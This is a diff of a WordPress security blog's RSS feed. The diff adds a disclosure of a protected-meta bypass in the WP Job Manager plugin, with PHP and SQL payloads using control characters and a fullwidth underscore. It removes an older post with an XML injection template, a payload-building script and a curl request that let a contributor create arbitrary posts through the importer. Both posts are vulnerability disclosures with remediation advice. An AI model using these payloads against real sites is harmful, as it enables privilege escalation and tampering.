@@ -12,7 +12,7 @@
 	<atom:link href="https://wpdeeply.com/category/plugins/feed/" rel="self" type="application/rss+xml" />
 	<link>http://wpdeeply.com/</link>
 	<description>// Silence is golden.  Not for you!</description>
-	<lastBuildDate>Sat, 14 Nov 2020 11:37:52 +0000</lastBuildDate>
+	<lastBuildDate>Wed, 25 Nov 2020 23:28:07 +0000</lastBuildDate>
 	<language>en-US</language>
 	<sy:updatePeriod>
 	hourly	</sy:updatePeriod>
@@ -20,6 +20,190 @@
 	1	</sy:updateFrequency>
 	<generator>https://wordpress.org/?v=5.5.3</generator>
 	<item>
+		<title>WP Job Manager permission escalation RCE</title>
+		<link>https://wpdeeply.com/wp-job-manager-permission-escalation-rce/</link>
+		
+		<dc:creator><![CDATA[root]]></dc:creator>
+		<pubDate>Wed, 25 Nov 2020 23:25:34 +0000</pubDate>
+				<category><![CDATA[plugins]]></category>
+		<category><![CDATA[0day]]></category>
+		<guid isPermaLink="false">https://wpdeeply.com/?p=89</guid>
+
+					<description><![CDATA[WP Job Manager plugin was sitting vulnerable for some time and attack vectors were available with lowest possible user role. Now in current version 1.34.4 some hardening was placed in the form of post_type checks &#38; nonce&#8217;s, but meddling with protected meta failed again. Almost the same way as WordPress core did. Eli5 PoC In &#8230;<p class="read-more"> <a class="" href="https://wpdeeply.com/wp-job-manager-permission-escalation-rce/"> <span class="screen-reader-text">WP Job Manager permission escalation RCE</span> Read More &#187;</a></p>]]></description>
+										<content:encoded><![CDATA[
+<p>WP Job Manager plugin was sitting <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-protected-meta-via-wp-job-manager/" target="_blank">vulnerable</a> for some time and attack vectors were available with lowest possible user role. Now in current version <a rel="noreferrer noopener" href="https://wordpress.org/plugins/wp-job-manager/#developers" target="_blank">1.34.4</a> some hardening was placed in the form of post_type checks &amp; nonce&#8217;s, but meddling with protected meta failed again. Almost the same way as WordPress <a href="https://gist.github.com/Slavco/d28074ef7f9ce7c08fd47e77af38e1cc" target="_blank" rel="noreferrer noopener">core did</a>.</p>
+
+
+
+<h2>Eli5 PoC</h2>
+
+
+
+<p>In <code>job_manager_duplicate_listing</code> before patch we had the following code:</p>
+
+
+
+<pre class="wp-block-code"><code lang="php" class="language-php">$post_meta = $wpdb->get_results( $wpdb->prepare( "SELECT meta_key, meta_value FROM {$wpdb->postmeta} WHERE post_id=%d", $post_id ) );
+...
+foreach ( $post_meta as $meta_key => $meta_value ) {
+			if ( in_array( $meta_key, $duplicate_ignore_keys, true ) ) {
+				continue;
+			}
+			update_post_meta( $new_post_id, $meta_key, maybe_unserialize( $meta_value ) );
+		}
+</code></pre>
+
+
+
+<p>And we all know that prefixing meta_key with simple \ will result with insert or update of protected meta_key. Beside this approach and nature of <code>update_post_meta</code> there is always option to update value of protected meta_key while updating value of ascii-control-char_meta_key. In order to be prevented situations like that the following is done:</p>
+
+
+
+<pre class="wp-block-code"><code lang="php" class="language-php">foreach ( $post_meta as $meta_key => $meta_value ) {
+			$sanitized_key = preg_replace( "/[^\x20-\x7E]/", '', $meta_key );
+
+			if ( in_array( $sanitized_key, $duplicate_ignore_keys, true ) ) {
+				continue;
+			}
+
+			if ( 1 === preg_match( '/^(_wp_|_oembed_)/', $sanitized_key ) ) {
+				continue;
+			}
+
+			update_post_meta( $new_post_id, wp_slash( $meta_key ), wp_slash( maybe_unserialize( $meta_value ) ) );
+		}
+</code></pre>
+
+
+
+<h3>Bypassing duplicate ignore keys check</h3>
+
+
+
+<p>What we have:</p>
+
+
+
+<pre class="wp-block-code"><code lang="php" class="language-php">$sanitized_key = preg_replace( "/[^\x20-\x7E]/", '', $meta_key );
+
+			if ( in_array( $sanitized_key, $duplicate_ignore_keys, true ) ) {
+				continue;
+			}
+</code></pre>
+
+
+
+<p>let we try for</p>
+
+
+
+<pre class="wp-block-code"><code lang="php" class="language-php">$meta_key = "\x08_ignore_key \x00\x01\x03";
+</code></pre>
+
+
+
+<p>result will be</p>
+
+
+
+<pre class="wp-block-code"><code lang="php" class="language-php">$sanitized_key = "_ignore_key ";
+</code></pre>
+
+
+
+<p>and that will fail because strict check into in_array. Luckily this payload could be prevented if this ignore meta key is WP protected meta, having the form: wp|oembed &#8230; because following check, an otherwise will result with update or insert+update in <code>update_post_meta</code>.</p>
+
+
+
+<pre class="wp-block-code"><code lang="php" class="language-php">if ( 1 === preg_match( '/^(_wp_|_oembed_)/', $sanitized_key ) ) {
+				continue;
+			}
+</code></pre>
+
+
+
+<p>Check the following DB query:</p>
+
+
+
+<pre class="wp-block-code"><code lang="sql" class="language-sql">UPDATE `wp_postmeta` SET `meta_value`="booFFZ" WHERE `meta_key` = concat('_wp_protected-meta ',char(8),char(1)) 
+</code></pre>
+
+
+
+<p>and will be successful because space before control characters.</p>
+
+
+
+<h3><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-job-manager-2.md#bypassing-wp--oembed-check"></a></h3>
+
+
+
+<h3>Bypassing <em>wp</em> | <em>oembed</em> check</h3>
+
+
+
+<p>It is simple, because MySQL will treat Fullwidth Low Line &#8220;＿&#8221; (U+FF3F) as &#8220;_&#8221; Low Line (U+005F). This means that</p>
+
+
+
+<pre class="wp-block-code"><code lang="php" class="language-php">$sanitized_key = preg_replace( "/[^\x20-\x7E]/", '', $meta_key );
+</code></pre>
+
+
+
+<p>will receive value of</p>
+
+
+
+<pre class="wp-block-code"><code lang="php" class="language-php">$sanitized_key = "wp_test";
+</code></pre>
+
+
+
+<p>which will fail on</p>
+
+
+
+<pre class="wp-block-code"><code lang="php" class="language-php">if ( 1 === preg_match( '/^(_wp_|_oembed_)/', $sanitized_key ) ) {
+				continue;
+			}
+</code></pre>
+
+
+
+<p>but will succeed into database (see the Fullwidth Low Line):</p>
+
+
+
+<pre class="wp-block-code"><code lang="sql" class="language-sql">UPDATE `wp_postmeta` SET `meta_value`="booFFS" WHERE `meta_key` = '＿wp_protected-meta' 
+</code></pre>
+
+
+
+<h2>Few facts</h2>
+
+
+
+<ul><li>MySQL is interesting</li><li>You can&#8217;t &#8220;fix&#8221; MySQL behavior with PHP regex</li></ul>
+
+
+
+<h2>Remediation</h2>
+
+
+
+<ul><li>Avoid update_post_meta and all another update_metadata variations. Use update_metadata_by_mid and add_metadata instead.</li><li>Changing update_post_meta with add_metadata in duplicate function should do the job- test for sure and don&#8217;t forget wp_slash on meta key and value.</li></ul>
+
+
+
+<p></p>
+]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
 		<title>WP Activity Log before 4.1.5 unauthenticated SQLi</title>
 		<link>https://wpdeeply.com/wp-activity-log-before-4-1-5-unauthenticated-sqli/</link>
 		
@@ -950,138 +1134,6 @@ add_action(init, "bypass_protected_meta");
 
 
 <ul><li>be careful with data used in MySQL WHERE</li><li><code>is_protected_meta</code>&nbsp;should be DB/MySQL check against current setup instead PHP one</li></ul>
-]]></content:encoded>
-					
-		
-		
-			</item>
-		<item>
-		<title>WordPress importer arbitrary post create</title>
-		<link>https://wpdeeply.com/wordpress-importer-arbitrary-post-create/</link>
-		
-		<dc:creator><![CDATA[root]]></dc:creator>
-		<pubDate>Thu, 23 Jul 2020 20:18:00 +0000</pubDate>
-				<category><![CDATA[core]]></category>
-		<category><![CDATA[plugins]]></category>
-		<category><![CDATA[0day]]></category>
-		<guid isPermaLink="false">https://wpdeeply.com/?p=33</guid>
-
-					<description><![CDATA[Native WordPress importer have 3 different parser classes:&#160;WXR_Parser_SimpleXML,&#160;WXR_Parser_XML&#160;and&#160;WXR_Parser_Regex. If first two required PHP extensions (simplexml&#160;and&#160;xml) aren’t installed or somehow they fail during export file parsing, then everything should be done by&#160;WXR_Parser_Regex&#160;class. Failing could occure because: malformed XML file Huge XML file with lot of data (libxml doesn’t obay memory constraints from php.ini) most important one: &#8230;<p class="read-more"> <a class="" href="https://wpdeeply.com/wordpress-importer-arbitrary-post-create/"> <span class="screen-reader-text">WordPress importer arbitrary post create</span> Read More &#187;</a></p>]]></description>
-										<content:encoded><![CDATA[
-<p>Native WordPress importer have 3 different parser classes:&nbsp;<code>WXR_Parser_SimpleXML</code>,&nbsp;<code>WXR_Parser_XML</code>&nbsp;and&nbsp;<code>WXR_Parser_Regex</code>. If first two required PHP extensions (<code>simplexml</code>&nbsp;and&nbsp;<code>xml</code>) aren’t installed or somehow they fail during export file parsing, then everything should be done by&nbsp;<code>WXR_Parser_Regex</code>&nbsp;class.</p>
-
-
-
-<p>Failing could occure because:</p>
-
-
-
-<ul><li>malformed XML file</li><li>Huge XML file with lot of data (libxml doesn’t obay memory constraints from php.ini)</li><li>most important one: those extensions can’t parse XML data that holds ascii control characters in it.</li></ul>
-
-
-
-<p>In the&nbsp;<code>WXR_Parser_Regex</code>&nbsp;we have following</p>
-
-
-
-<pre class="wp-block-code"><code lang="php" class="language-php">foreach ( $multiline_tags as $tag => $handler ) {
-	// Handle multi-line tags on a singular line
-	if ( preg_match( '|&lt;' . $tag . '>(.*?)|is', $importline, $matches ) ) {
-...
-</code></pre>
-
-
-
-<p>and this means that somewhere in the user input if there is&nbsp;<br><code>&lt; / item &gt;</code>&nbsp;we talk about end of the post. We all know that meta / custom fields can hold anything, so we have our entry point. Fallback towards&nbsp;<code>WXR_Parser_Regex</code>&nbsp;checked and entry point checked, time for demo.</p>
-
-
-
-<h2>Eli5 PoC</h2>
-
-
-
-<p>On any WP instance log in with&nbsp;<code>contributor</code>&nbsp;user role. Create blog post and add meta / custom field with following value <img src="https://s.w.org/images/core/emoji/13.0.0/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /> Template payload for meta value:</p>
-
-
-
-<pre class="wp-block-code"><code lang="xml" class="language-xml">&lt;/wp:meta_value>&lt;/wp:postmeta>&lt;/item>
-[asciicontrol]
-&lt;item>
-&lt;title>Attack-Post-1337&lt;/title>
-&lt;link>http://attack.post/2020/07/19/attack-post/&lt;/link>
-&lt;pubDate>Sun, 19 Jul 2020 20:57:17 +0000&lt;/pubDate>
-&lt;dc:creator>attacker&lt;/dc:creator>
-&lt;guid isPermaLink="false">http://attack.post?p=1337&lt;/guid>
-&lt;description>&lt;/description>
-&lt;content:encoded>&lt;!-- wp:paragraph -->
-&lt;p>boom jee&lt;/p>
-&lt;!-- /wp:paragraph -->&lt;/content:encoded>
-&lt;excerpt:encoded>&lt;/excerpt:encoded>
-&lt;wp:post_id>1337&lt;/wp:post_id>
-&lt;wp:post_date>2020-07-19 20:57:17&lt;/wp:post_date>
-&lt;wp:post_date_gmt>2020-07-19 20:57:17&lt;/wp:post_date_gmt>
-&lt;wp:comment_status>open&lt;/wp:comment_status>
-&lt;wp:ping_status>open&lt;/wp:ping_status>
-&lt;wp:post_name>attack-post&lt;/wp:post_name>
-&lt;wp:status>publish&lt;/wp:status>
-&lt;wp:post_parent>0&lt;/wp:post_parent>
-&lt;wp:menu_order>0&lt;/wp:menu_order>
-&lt;wp:post_type>post&lt;/wp:post_type>
-&lt;wp:post_password>&lt;/wp:post_password>
-&lt;wp:is_sticky>0&lt;/wp:is_sticky>
-&lt;category domain="category" nicename="uncategorized">Uncategorized&lt;/category>
-&lt;wp:postmeta>
-&lt;wp:meta_key>_test&lt;/wp:meta_key>
-&lt;wp:meta_value>
-
-</code></pre>
-
-
-
-<p></p>
-
-
-
-<p>prepare this template payload on the following way</p>
-
-
-
-<pre class="wp-block-code"><code lang="php" class="language-php">//grab the content
-$cnt = file_get_contents("attack-template.txt");
-//add ascii control characters
-$cnt = str_replace("[asciicontrol]", "\x00\x01\x02\x08\x16", $cnt);
-//url encode it and it is ready to be used towards any meta (custom) field as value
-file_put_contents("final-payload.txt", urlencode($cnt));
-</code></pre>
-
-
-
-<p>and create the meta / custom field as&nbsp;<code>contributor</code>.</p>
-
-
-
-<pre class="wp-block-code"><code lang="bash" class="language-bash">curl 'http://local.target/wp-admin/admin-ajax.php' -H 'Cookie: ...' --data '_ajax_nonce=0&amp;action=add-meta&amp;metakeyselect=%23NONE%23&amp;metakeyinput=wpdeeply&amp;metavalue=[content_from_final-payload.txt]&amp;_ajax_nonce-add-meta=61b457d48c&amp;post_id=[your_post_id]' --compressed
-</code></pre>
-
-
-
-<p>Now log in as&nbsp;<code>administrator</code>&nbsp;export the Posts and import them anywhere you want. Say hello to extra post of any type with any data created by &nbsp;<code>contributor</code>.</p>
-
-
-
-<h2>Few facts</h2>
-
-
-
-<ul><li>Many mainstream plugins accept raw user input in meta / custom fields</li><li>RCE could be achieved without user/attacker interaction when import occurs. <a href="https://wpdeeply.com/wordpress-null-byte-to-rce-0-day-bug/" target="_blank" rel="noreferrer noopener">Example 1</a> and <a href="https://wpdeeply.com/wordpress-write-image-to-any-directory-rce/" target="_blank" rel="noreferrer noopener">Example 2</a></li><li><a href="https://wpdeeply.com/wordpress-updates-from-core-and-security/" target="_blank" rel="noreferrer noopener">persistence</a> and <a href="https://github.com/Slavco/wp-weaver" target="_blank" rel="noreferrer noopener">stealth agents</a> planting is 100% option in WP</li></ul>
-
-
-
-<h2>Remediation</h2>
-
-
-
-<ul><li>Sign the posts / data exported and check the signature with data need to be imported</li><li>Follow 101 security practices for web applications</li></ul>
 ]]></content:encoded>
 					
 		
